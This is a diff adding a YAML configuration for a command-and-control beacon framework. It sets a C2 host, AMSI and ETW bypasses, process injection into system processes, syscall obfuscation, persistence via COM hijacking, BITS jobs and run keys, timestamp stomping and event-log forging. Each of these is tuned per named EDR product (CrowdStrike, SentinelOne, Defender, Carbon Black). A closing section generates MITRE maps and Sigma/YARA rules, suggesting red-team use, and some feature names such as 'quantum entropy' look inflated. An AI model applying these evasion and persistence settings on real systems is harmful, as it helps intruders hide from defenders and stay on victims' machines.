@@ -1,0 +1,764 @@
+# Beacon Configuration - Elite Sleepmask Cloaking
+# Ultimate Edition with AI-Dynamic Memory Cloaking
+
+# Basic beacon settings
+beacon:
+  id: ""  # Auto-generated if empty
+  c2_host: "c2.example.com"
+  c2_port: 443
+  use_https: true
+  sleep_time: 60  # Base sleep in seconds
+  jitter_percent: 40
+  max_retries: 3
+
+# Kill date and working hours (OPSEC)
+opsec:
+  kill_date: null  # Format: YYYY-MM-DD or null
+  working_hours:
+    enabled: false
+    start_hour: 9
+    end_hour: 17
+    timezone: "local"
+
+# Network configuration
+network:
+  proxy: null  # http://proxy:8080 or null
+  domain_fronting:
+    enabled: false
+    front_host: "cdn.example.com"
+    actual_host: "c2.example.com"
+  traffic_profile: "google_search"  # google_search, microsoft_update, aws_api
+  user_agent_rotation: true
+  tls_fingerprint_rotation: true
+
+# Evasion settings
+evasion:
+  level: 3  # 1=basic, 2=medium, 3=high, 4=paranoid
+  
+  # Sleep obfuscation
+  sleep:
+    enabled: true
+    pattern: "adaptive"  # gaussian, fibonacci, poisson, ml_entropy, adaptive
+    memory_obfuscation: true
+    syscall_jitter: true
+  
+  # AMSI/ETW bypass
+  amsi_bypass:
+    enabled: true
+    technique: "ai_select"  # reflection, memory_patch, ai_select
+  
+  etw_bypass:
+    enabled: true
+    technique: "patch"  # patch, provider_blind, ai_select
+  
+  # Anti-sandbox
+  sandbox_detection:
+    enabled: true
+    action: "exit"  # exit, sleep, continue
+
+# === NEW: Sleepmask Cloaking Elite Settings ===
+sleepmask_cloaking:
+  enabled: true
+  
+  # AI-Dynamic selection
+  ai_adaptive: true
+  auto_detect_edr: true
+  
+  # Cloak level: NONE, BASIC, STANDARD, ADVANCED, ELITE, PARANOID
+  cloak_level: "ELITE"
+  
+  # Multi-stage masking
+  multi_stage:
+    enabled: true
+    stages:
+      - "decrypt"
+      - "execute"
+      - "remask"
+      - "cleanup"
+      - "verify"
+  
+  # ROP gadget chain
+  rop_chain:
+    enabled: true
+    gadget_density: 0.5  # 0.0-1.0 (higher = more gadgets)
+    runtime_build: true
+    mutation: true  # Mutate gadgets each cycle
+  
+  # Quantum entropy
+  entropy:
+    enabled: true
+    pool_size: 64
+    reseed_interval: 100  # Reseed after N operations
+    target_entropy: 6.5  # Stay below EDR detection threshold (7.5)
+  
+  # Memory masking
+  memory_mask:
+    algorithm: "xor"  # xor, aes, chacha20
+    key_rotation: true
+    key_size: 32  # bytes
+    mask_code_regions: true
+    mask_heap_regions: true
+  
+  # OPSEC layer
+  opsec:
+    # Heap spoofing
+    heap_spoof:
+      enabled: true
+      decoy_count: 15
+      patterns:
+        - "pe_header"
+        - "bitmap"
+        - "json"
+        - "xml"
+        - "certificate"
+    
+    # Forensic artifact wipe
+    artifact_wipe:
+      enabled: true
+      targets:
+        - "peb"           # Process Environment Block
+        - "teb"           # Thread Environment Block
+        - "heap_metadata" # Heap tracking data
+        - "string_refs"   # String references
+        - "module_list"   # Loaded module list
+        - "vad"           # Virtual Address Descriptors
+    
+    # Timing evasion
+    timing:
+      mask_before_scan: true
+      scan_interval_factor: 0.5  # Mask at half the EDR scan interval
+      jitter_percent: 40
+  
+  # Remask cycle settings
+  remask:
+    enabled: true
+    interval: 30  # Remask every N seconds during sleep
+    new_key_each_cycle: true
+    rotate_decoys: true
+    rotate_percent: 33  # Rotate 33% of decoys each cycle
+
+# EDR-specific overrides (auto-applied when EDR detected)
+edr_profiles:
+  crowdstrike_falcon:
+    cloak_level: "ELITE"
+    rop_chain:
+      gadget_density: 0.5
+    heap_spoof:
+      decoy_count: 20
+    artifact_wipe:
+      targets:
+        - "heap_metadata"
+        - "peb"
+        - "teb"
+        - "vad"
+    timing:
+      scan_interval_factor: 0.3  # Falcon scans frequently
+  
+  sentinelone:
+    cloak_level: "ELITE"
+    rop_chain:
+      gadget_density: 0.7  # S1 needs heavy ROP
+    heap_spoof:
+      decoy_count: 25
+    artifact_wipe:
+      targets:
+        - "vad"
+        - "heap_metadata"
+        - "module_list"
+        - "thread_context"
+    timing:
+      scan_interval_factor: 0.25
+  
+  defender_atp:
+    cloak_level: "ADVANCED"
+    rop_chain:
+      gadget_density: 0.3
+    entropy:
+      target_entropy: 6.0  # Defender has higher entropy sensitivity
+    heap_spoof:
+      decoy_count: 15
+    timing:
+      scan_interval_factor: 0.4
+  
+  carbon_black:
+    cloak_level: "ADVANCED"
+    rop_chain:
+      gadget_density: 0.4
+    heap_spoof:
+      decoy_count: 15
+    timing:
+      scan_interval_factor: 0.35
+  
+  none:
+    cloak_level: "STANDARD"
+    rop_chain:
+      enabled: false
+    heap_spoof:
+      decoy_count: 5
+    artifact_wipe:
+      enabled: false
+
+# === NEW: Process Injection Masterclass Settings ===
+process_injection:
+  enabled: true
+  
+  # AI-Dynamic selection
+  ai_adaptive: true
+  auto_detect_edr: true
+  
+  # Multi-stage injection chain
+  multi_stage:
+    enabled: true
+    chain:
+      - "ghosting"
+      - "herpaderping"
+      - "transacted_hollowing"
+      - "module_stomping"
+      - "early_bird_apc"
+      - "classic_crt"
+  
+  # Target selection
+  targets:
+    preferred:
+      - "explorer.exe"
+      - "RuntimeBroker.exe"
+      - "dllhost.exe"
+      - "sihost.exe"
+      - "taskhostw.exe"
+    avoid:
+      - "MsMpEng.exe"
+      - "csrss.exe"
+      - "lsass.exe"
+      - "csfalconservice.exe"
+      - "SentinelAgent.exe"
+  
+  # OPSEC Layer
+  opsec:
+    # PPID Spoofing
+    ppid_spoof:
+      enabled: true
+      parent: "explorer.exe"
+    
+    # PEB/TEB Mutation
+    mutation:
+      enabled: true
+      targets:
+        - "peb_being_debugged"
+        - "peb_heap_flags"
+        - "peb_ntglobal_flag"
+    
+    # Artifact Wiping
+    artifact_wipe:
+      enabled: true
+      targets:
+        - "process_params"
+        - "handle_table"
+        - "memory_map"
+    
+    # Pre-injection delay
+    delay_ms: 2000
+  
+  # Syscall options
+  syscalls:
+    enabled: true
+    bypass_hooks: true
+  
+  # Shellcode options
+  shellcode:
+    obfuscate: true
+    cleanup_traces: true
+
+# EDR-specific injection overrides (auto-applied when EDR detected)
+edr_injection_profiles:
+  crowdstrike_falcon:
+    primary_technique: "herpaderping"
+    fallback_chain:
+      - "ghosting"
+      - "transacted_hollowing"
+      - "syscall"
+    ppid_spoof:
+      enabled: true
+    mutation:
+      enabled: true
+      targets:
+        - "peb_being_debugged"
+        - "peb_heap_flags"
+    delay_ms: 3000
+    use_syscalls: true
+  
+  sentinelone:
+    primary_technique: "transacted_hollowing"
+    fallback_chain:
+      - "ghosting"
+      - "doppelganging"
+      - "module_stomping"
+    ppid_spoof:
+      enabled: true
+    mutation:
+      enabled: true
+      targets:
+        - "peb_image_base"
+        - "teb_client_id"
+    delay_ms: 2500
+    use_syscalls: true
+  
+  defender_atp:
+    primary_technique: "ghosting"
+    fallback_chain:
+      - "early_bird_apc"
+      - "module_stomping"
+    ppid_spoof:
+      enabled: true
+    mutation:
+      enabled: false
+    delay_ms: 1500
+    use_syscalls: false
+  
+  carbon_black:
+    primary_technique: "herpaderping"
+    fallback_chain:
+      - "doppelganging"
+      - "transacted_hollowing"
+    ppid_spoof:
+      enabled: true
+    mutation:
+      enabled: true
+    delay_ms: 2000
+    use_syscalls: true
+  
+  none:
+    primary_technique: "early_bird_apc"
+    fallback_chain:
+      - "hollowing"
+      - "classic_crt"
+    ppid_spoof:
+      enabled: false
+    mutation:
+      enabled: false
+    delay_ms: 500
+    use_syscalls: false
+
+# === NEW: Syscall Obfuscator Monster Settings ===
+syscall_obfuscation:
+  enabled: true
+  
+  # AI-Adaptive layer selection
+  ai_adaptive: true
+  auto_detect_edr: true
+  
+  # Primary obfuscation layer
+  # Options: none, indirect_call, fresh_ssn, obfuscated_stub, gan_mutate, entropy_heavy, stub_swap, full_monster
+  primary_layer: "gan_mutate"
+  
+  # Multi-layer obfuscation
+  multi_layer:
+    enabled: true
+    layers:
+      - "fresh_ssn"
+      - "obfuscated_stub"
+      - "gan_mutate"
+  
+  # ML/GAN options
+  ml_mutation:
+    enabled: true
+    gan_latent_dim: 32
+    mutation_rate: 0.7
+  
+  # Stub options
+  stub:
+    # Pattern: standard, shuffled, junked, encrypted, polymorphic, gan_generated
+    pattern: "polymorphic"
+    junk_instruction_ratio: 0.5
+    register_shuffle: true
+    encrypt: true
+  
+  # SSN options
+  ssn:
+    use_fresh_ntdll: true
+    randomize_order: true
+  
+  # Runtime options
+  runtime:
+    mutation_enabled: true
+    post_call_reseed: true
+    mutation_interval_calls: 3
+  
+  # OPSEC / Spoof options
+  opsec:
+    spoof_calls:
+      enabled: true
+      before_syscall: true
+      after_syscall: true
+      targets:
+        - "NtQuerySystemInformation"
+        - "NtClose"
+    artifact_wipe:
+      enabled: true
+  
+  # Timing
+  timing:
+    add_jitter: true
+    jitter_range_ms: [10, 100]
+
+# EDR-specific syscall obfuscation profiles
+edr_syscall_profiles:
+  crowdstrike_falcon:
+    primary_layer: "stub_swap"
+    secondary_layers:
+      - "fresh_ssn"
+      - "obfuscated_stub"
+      - "gan_mutate"
+    entropy_level: 0.7
+    junk_ratio: 0.5
+    mutation_rate: 0.8
+    stub_pattern: "polymorphic"
+    spoof_calls:
+      - "NtQuerySystemInformation"
+      - "NtClose"
+    delay_range_ms: [50, 200]
+    notes: "Falcon has aggressive syscall monitoring - use stub swap + polymorphic"
+  
+  sentinelone:
+    primary_layer: "gan_mutate"
+    secondary_layers:
+      - "fresh_ssn"
+      - "stub_swap"
+    entropy_level: 0.6
+    junk_ratio: 0.4
+    mutation_rate: 0.9
+    stub_pattern: "gan_generated"
+    spoof_calls:
+      - "NtQueryInformationProcess"
+    delay_range_ms: [100, 300]
+    notes: "S1 has ML-based detection - fight fire with fire using GAN mutation"
+  
+  defender:
+    primary_layer: "entropy_heavy"
+    secondary_layers:
+      - "indirect_call"
+      - "obfuscated_stub"
+    entropy_level: 0.9
+    junk_ratio: 0.7
+    mutation_rate: 0.5
+    stub_pattern: "junked"
+    spoof_calls:
+      - "NtCreateFile"
+      - "NtReadFile"
+    delay_range_ms: [20, 100]
+    notes: "Defender uses entropy analysis - overwhelm with high entropy patterns"
+  
+  carbon_black:
+    primary_layer: "stub_swap"
+    secondary_layers:
+      - "obfuscated_stub"
+      - "indirect_call"
+    entropy_level: 0.5
+    junk_ratio: 0.6
+    mutation_rate: 0.7
+    stub_pattern: "shuffled"
+    spoof_calls:
+      - "NtQuerySystemInformation"
+    delay_range_ms: [30, 150]
+    notes: "CB monitors syscall patterns - shuffle and swap"
+  
+  none:
+    primary_layer: "indirect_call"
+    secondary_layers: []
+    entropy_level: 0.3
+    junk_ratio: 0.2
+    mutation_rate: 0.3
+    stub_pattern: "standard"
+    spoof_calls: []
+    delay_range_ms: [5, 20]
+    notes: "No EDR - use basic indirect calls for reliability"
+
+# === NEW: Persistence God Mode Settings ===
+persistence_god:
+  enabled: true
+  
+  # AI-Dynamic chain selection
+  ai_adaptive: true
+  auto_detect_edr: true
+  
+  # Primary persistence chain
+  # Options: wmi_event, com_hijack, bits_job, schtask, runkey, service, dll_search, startup_folder, full_chain
+  primary_chain: "bits_job"
+  
+  # Multi-chain persistence
+  multi_chain:
+    enabled: true
+    chains:
+      - "bits_job"
+      - "com_hijack"
+      - "runkey"
+    install_delay_between: [2000, 8000]  # ms between chain installs
+  
+  # Artifact mutation
+  mutation:
+    enabled: true
+    mutation_rate: 0.7
+    targets:
+      - "registry_key"
+      - "registry_value"
+      - "file_path"
+      - "task_name"
+      - "service_name"
+      - "com_clsid"
+      - "bits_job_name"
+    use_legit_prefixes: true  # Windows, Microsoft, System prefixes
+    reseed_after_install: true
+  
+  # Timestamp manipulation
+  timestamp_stomp:
+    enabled: true
+    reference_dir: "C:\\Windows\\System32"  # Match timestamps from here
+    spread_days: 365  # Random timestamp spread
+  
+  # Spoof events (log forging)
+  spoof_events:
+    enabled: true
+    spoof_before_install: true
+    spoof_after_install: true
+    event_count: [3, 7]  # Random count per install
+    event_types:
+      - "schtask_create"
+      - "schtask_delete"
+      - "registry_set"
+      - "file_create"
+  
+  # Artifact wiping
+  artifact_wipe:
+    enabled: true
+    targets:
+      - "prefetch"
+      - "recent"
+      - "temp"
+      - "jump_lists"
+    wipe_after_install: true
+  
+  # Registry muting
+  reg_muting:
+    enabled: true
+    mute_duration_ms: 5000  # Mute monitoring briefly during write
+  
+  # OPSEC Layer
+  opsec:
+    check_sandbox: true
+    check_vm: true
+    check_debugger: true
+    check_av_running: true
+    min_uptime_minutes: 5  # Don't persist immediately
+    kill_date: null  # Remove persistence after this date
+
+# EDR-specific persistence profiles
+edr_persistence_profiles:
+  crowdstrike_falcon:
+    primary_chain: "com_hijack"
+    secondary_chains:
+      - "bits_job"
+      - "dll_search"
+    avoid_chains:
+      - "schtask"
+      - "wmi_event"
+    mutation_rate: 0.9
+    use_reg_muting: true
+    timestamp_stomp: true
+    spoof_events: true
+    install_delay_ms: [5000, 15000]
+    notes: "Falcon monitors scheduled tasks heavily - use COM hijack primary"
+  
+  sentinelone:
+    primary_chain: "bits_job"
+    secondary_chains:
+      - "com_hijack"
+      - "dll_search"
+    avoid_chains:
+      - "service"
+      - "schtask"
+    mutation_rate: 0.9
+    use_reg_muting: true
+    timestamp_stomp: true
+    spoof_events: true
+    install_delay_ms: [3000, 10000]
+    notes: "S1 watches service creation - use BITS for reliability"
+  
+  defender_atp:
+    primary_chain: "runkey"
+    secondary_chains:
+      - "bits_job"
+      - "com_hijack"
+    avoid_chains:
+      - "wmi_event"
+      - "service"
+    mutation_rate: 0.8
+    use_reg_muting: true
+    timestamp_stomp: true
+    spoof_events: true
+    install_delay_ms: [2000, 8000]
+    notes: "Defender has WMI visibility - registry persistence with muting"
+  
+  carbon_black:
+    primary_chain: "dll_search"
+    secondary_chains:
+      - "com_hijack"
+      - "bits_job"
+    avoid_chains:
+      - "wmi_event"
+      - "service"
+    mutation_rate: 0.7
+    use_reg_muting: false
+    timestamp_stomp: true
+    spoof_events: true
+    install_delay_ms: [2500, 7000]
+    notes: "CB behavior analysis - DLL search order is stealthiest"
+  
+  elastic_edr:
+    primary_chain: "bits_job"
+    secondary_chains:
+      - "runkey"
+      - "com_hijack"
+    avoid_chains:
+      - "wmi_event"
+    mutation_rate: 0.6
+    use_reg_muting: true
+    timestamp_stomp: true
+    spoof_events: false
+    install_delay_ms: [1500, 5000]
+    notes: "Elastic has WMI rules - BITS + registry combo"
+  
+  none:
+    primary_chain: "schtask"
+    secondary_chains:
+      - "runkey"
+    avoid_chains: []
+    mutation_rate: 0.3
+    use_reg_muting: false
+    timestamp_stomp: false
+    spoof_events: false
+    install_delay_ms: [500, 2000]
+    notes: "No EDR - use reliable scheduled task"
+
+# === NEW: Reporting & Visualization Pro Settings ===
+reporting:
+  enabled: true
+  
+  # Auto-generate report after chain completion
+  auto_report: true
+  
+  # AI-Dynamic summary
+  ai_summary:
+    enabled: true
+    style: "executive"  # executive, technical, twitter
+    include_recommendations: true
+    edr_breakdown: true
+  
+  # MITRE ATT&CK mapping
+  mitre_mapping:
+    enabled: true
+    generate_heatmap: true
+    include_subtechniques: true
+    coverage_threshold: 0.7  # Minimum coverage to highlight
+  
+  # Detection rule generation
+  detection_rules:
+    sigma:
+      enabled: true
+      level: "HIGH"  # INFORMATIONAL, LOW, MEDIUM, HIGH, CRITICAL
+      include_correlation: true  # Cross-technique rules
+    yara:
+      enabled: true
+      string_patterns: true
+      hex_patterns: true
+    snort: false
+    suricata: false
+  
+  # Output formats
+  output:
+    format: "html"  # html, pdf, json, markdown, all
+    output_dir: "reports"
+    filename_prefix: "chain_report"
+    timestamp_suffix: true
+  
+  # HTML report settings
+  html:
+    theme: "hacker"  # dark, light, hacker
+    interactive: true
+    tabs:
+      summary: true
+      mitre_coverage: true
+      sigma_rules: true
+      timeline: true
+      attack_flow: true
+    mermaid_diagrams: true
+    htmx_live: true
+  
+  # PDF settings
+  pdf:
+    enabled: true
+    encrypt: false
+    password: ""  # Leave empty or set password
+    watermark: false
+    watermark_text: "CONFIDENTIAL"
+  
+  # Data anonymization (OPSEC)
+  anonymize:
+    enabled: true
+    anonymize_ips: true
+    anonymize_hostnames: true
+    anonymize_users: true
+    anonymize_paths: true
+    preserve_format: true  # Keep IP/hostname format structure
+  
+  # Demo preparation
+  demo:
+    generate_twitter_thread: true
+    video_timestamps: true
+    highlight_evasion_wins: true
+    export_screenshots: false
+
+# EDR-specific reporting profiles
+edr_reporting_profiles:
+  crowdstrike_falcon:
+    ai_summary:
+      style: "technical"
+      edr_breakdown: true
+    detection_rules:
+      sigma_level: "HIGH"
+      include_falcon_specific: true
+    demo:
+      highlight_text: "Falcon bypass achieved with %{bypass_rate}% evasion"
+  
+  sentinelone:
+    ai_summary:
+      style: "technical"
+      edr_breakdown: true
+    detection_rules:
+      sigma_level: "HIGH"
+      include_s1_specific: true
+    demo:
+      highlight_text: "SentinelOne ML engine evaded via GAN mutation"
+  
+  defender_atp:
+    ai_summary:
+      style: "executive"
+      edr_breakdown: true
+    detection_rules:
+      sigma_level: "MEDIUM"
+      include_defender_specific: true
+    demo:
+      highlight_text: "Defender ATP bypassed through entropy modulation"
+  
+  none:
+    ai_summary:
+      style: "executive"
+      edr_breakdown: false
+    detection_rules:
+      sigma_level: "LOW"
+    demo:
+      highlight_text: "Full chain execution completed"
+
+# Logging
+logging:
+  enabled: false
+  level: "WARNING"  # DEBUG, INFO, WARNING, ERROR
+  file: null  # Log file path or null for no file
